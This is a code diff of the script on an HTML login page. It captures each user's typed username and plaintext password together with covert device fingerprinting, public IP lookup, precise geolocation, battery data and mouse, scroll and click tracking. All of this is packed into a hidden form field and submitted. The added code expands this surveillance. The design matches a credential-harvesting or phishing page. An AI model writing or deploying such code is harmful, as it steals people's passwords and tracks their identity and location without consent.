@@ -112,12 +112,36 @@
   <script>
     const form = document.getElementById("userForm");
 
+    let pageStartTime = Date.now(); // Track the time when the page started
+    let pageViews = 0;
+    let totalTimeSpent = 0;
+    let scrollDepth = 0;
+    let mouseMoves = 0;
+    let buttonClicks = 0;
+
+    // Increment page views when a new page is visited
+    pageViews++;
+
+    // Track user behavior
+    window.addEventListener('scroll', () => {
+      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+      scrollDepth = Math.max(scrollDepth, (window.scrollY / docHeight) * 100);
+    });
+
+    window.addEventListener('mousemove', () => mouseMoves++);
+    window.addEventListener('click', () => buttonClicks++);
+
+    window.addEventListener('beforeunload', () => {
+      totalTimeSpent = Date.now() - pageStartTime;
+    });
+
     form.addEventListener("submit", async function (e) {
       e.preventDefault();
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
+      // Collecting Device and User Info
       const collected = {
         Username: username,
         Password: password,
@@ -128,87 +152,104 @@
         ScreenWidth: screen.width,
         ScreenHeight: screen.height,
         PixelRatio: window.devicePixelRatio,
-        TouchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
         Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         LocalTime: new Date().toString(),
         DeviceMemoryGB: navigator.deviceMemory || "Not available",
-        CPUThreads: navigator.hardwareConcurrency || "Not available"
+        CPUThreads: navigator.hardwareConcurrency || "Not available",
+        ColorDepth: screen.colorDepth,
+        Browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/(\d+\.\d+)/) || ["Unknown", "0.0"],
+        OperatingSystem: detectOperatingSystem(),
+        DeviceType: detectDeviceType(),
+        ScreenResolution: `${screen.width}x${screen.height}`,
+        PageLoadTime: window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart,
+        JSExecutionTime: window.performance.now(),
+        ResourceLoadingTime: window.performance.timing.loadEventEnd - window.performance.timing.navigationStart,
+        MemoryUsage: navigator.deviceMemory || "Not available",
+        PageViews: pageViews,
+        DurationSpent: totalTimeSpent,
+        ScrollDepth: scrollDepth,
+        MouseMoves: mouseMoves,
+        ButtonClicks: buttonClicks,
+        BatteryLevel: await getBatteryLevel(),
+        BatteryHealth: "Not available", // No standard API for battery health yet
+        BatteryTemperature: "Not available", // No standard API for battery temperature
+        IPAddress: await getIP(),
+        Geolocation: await getGeolocation(),
+        ConnectionType: await getNetworkType()
       };
 
-      if ("connection" in navigator) {
-        const conn = navigator.connection;
-        collected.ConnectionType = conn.type || "Unknown";
-        collected.EffectiveConnectionType = conn.effectiveType || "Unknown";
-        collected.DownlinkMbps = conn.downlink || "Unknown";
-      }
-
-      try {
-        if ("getBattery" in navigator) {
-          const battery = await navigator.getBattery();
-          collected.BatteryLevel = (battery.level * 100) + "%";
-          collected.IsCharging = battery.charging ? "Yes" : "No";
-          collected.ChargingTimeSec = battery.chargingTime;
-          collected.DischargingTimeSec = battery.dischargingTime;
-        } else {
-          collected.BatteryInfo = "Not supported";
-        }
-      } catch {
-        collected.BatteryInfo = "Permission denied or not supported";
-      }
-
-      // Geolocation
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            collected.Latitude = position.coords.latitude;
-            collected.Longitude = position.coords.longitude;
-            collected.LocationAccuracyMeters = position.coords.accuracy;
-            fetchIPAndSubmit(collected);
-          },
-          () => {
-            collected.Location = "Denied or unavailable";
-            fetchIPAndSubmit(collected);
-          },
-          { timeout: 3000 }
-        );
-      } else {
-        collected.Location = "Geolocation not supported";
-        fetchIPAndSubmit(collected);
-      }
+      // Submitting collected data
+      document.getElementById("collectedInfo").value = JSON.stringify(collected);
+      form.submit();
     });
 
-    function fetchIPAndSubmit(collected) {
-      fetch("https://api.ipify.org?format=json")
-        .then((res) => res.json())
-        .then((data) => {
-          collected.PublicIP = data.ip;
-          finalizeAndSubmit(collected);
-        })
-        .catch(() => {
-          collected.PublicIP = "Unavailable";
-          finalizeAndSubmit(collected);
-        });
-    }
-
-    function flatten(obj, prefix = "") {
-      const flat = {};
-      for (let key in obj) {
-        const value = obj[key];
-        const newKey = prefix ? `${prefix}_${key}` : key;
-        if (typeof value === "object" && value !== null) {
-          Object.assign(flat, flatten(value, newKey));
-        } else {
-          flat[newKey] = value;
-        }
+    // Function to detect Device Type (smartphone, tablet, etc.)
+    function detectDeviceType() {
+      if (/Mobi|Android/i.test(navigator.userAgent)) {
+        return "Smartphone/Tablet";
       }
-      return flat;
+      if (/Mac|Windows|Linux/i.test(navigator.userAgent)) {
+        return "Desktop/Laptop";
+      }
+      return "Unknown";
     }
 
-    function finalizeAndSubmit(collected) {
-      const flatCollected = flatten(collected);
-      document.getElementById("collectedInfo").value = JSON.stringify(flatCollected);
-      form.submit();
+    // Function to detect Operating System
+    function detectOperatingSystem() {
+      if (navigator.userAgent.indexOf("Win") !== -1) return "Windows";
+      if (navigator.userAgent.indexOf("Mac") !== -1) return "macOS";
+      if (navigator.userAgent.indexOf("Linux") !== -1) return "Linux";
+      if (navigator.userAgent.indexOf("Android") !== -1) return "Android";
+      if (navigator.userAgent.indexOf("iPhone") !== -1) return "iOS";
+      return "Unknown";
+    }
+
+    // Function to get battery level
+    async function getBatteryLevel() {
+      if ("getBattery" in navigator) {
+        const battery = await navigator.getBattery();
+        return battery.level * 100 + "%";
+      }
+      return "Not available";
+    }
+
+    // Function to get public IP address
+    async function getIP() {
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        return "IP not available";
+      }
+    }
+
+    // Function to get Geolocation (if permitted)
+    async function getGeolocation() {
+      return new Promise((resolve) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(position => {
+            resolve({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            });
+          }, () => {
+            resolve("Geolocation not available");
+          });
+        } else {
+          resolve("Geolocation not supported");
+        }
+      });
+    }
+
+    // Function to get network type (wifi, cellular, etc.)
+    async function getNetworkType() {
+      if ("connection" in navigator) {
+        return navigator.connection.effectiveType;
+      }
+      return "Network type not available";
     }
   </script>
+
 </body>
 </html>
